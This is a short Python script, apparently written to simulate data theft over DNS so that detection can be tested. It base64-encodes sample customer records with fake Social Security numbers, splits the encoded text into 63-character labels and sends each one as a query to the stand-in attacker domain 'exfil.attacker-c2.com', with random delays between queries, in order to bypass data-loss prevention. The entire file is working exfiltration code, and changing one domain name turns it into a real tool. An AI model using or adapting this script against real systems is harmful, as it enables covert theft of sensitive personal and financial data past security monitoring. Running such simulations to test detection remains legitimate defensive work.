#!/usr/bin/env python3
"""
DNS Exfiltration - encodes data in DNS queries
This simulates tunneling data out via DNS to bypass DLP
"""

import dns.resolver
import base64
import time
import json

def exfiltrate_via_dns(data, domain="exfil.attacker-c2.com"):
    """
    Encode data as base64 and send via DNS subdomains
    Example: aGVsbG8ud29ybGQ=.exfil.attacker-c2.com
    """
    
    print(f"\n🔴 Starting DNS exfiltration to {domain}...")
    
    # Encode data
    encoded = base64.b64encode(data.encode()).decode()
    
    # Split into 63-char chunks (DNS label limit)
    chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
    
    query_count = 0
    
    for i, chunk in enumerate(chunks):
        # Create DNS query
        query_domain = f"{chunk}.{domain}"
        
        try:
            # This will fail (domain doesn't exist) but the query is logged
            dns.resolver.resolve(query_domain, 'A')
        except:
            # Expected to fail - we just want the query logged
            pass
        
        query_count += 1
        print(f"  📡 DNS Query #{query_count}: {query_domain[:50]}...")
        
        # Small delay
        time.sleep(random.uniform(0.5, 2))
    
    print(f"\n🔴 DNS exfiltration complete!")
    print(f"   Queries sent: {query_count}")
    print(f"   Data size: {len(data)} bytes")
    print(f"   Encoded size: {len(encoded)} bytes")
    print(f"   ⚠️ High entropy DNS queries should be detected!")

if __name__ == '__main__':
    import random
    
    # Sample customer data to exfiltrate
    sample_data = json.dumps({
        'customers': [
            {'name': 'John Smith', 'ssn': '123-45-6789', 'account': '987654321'},
            {'name': 'Jane Doe', 'ssn': '987-65-4321', 'account': '123456789'}
        ]
    })
    
    exfiltrate_via_dns(sample_data)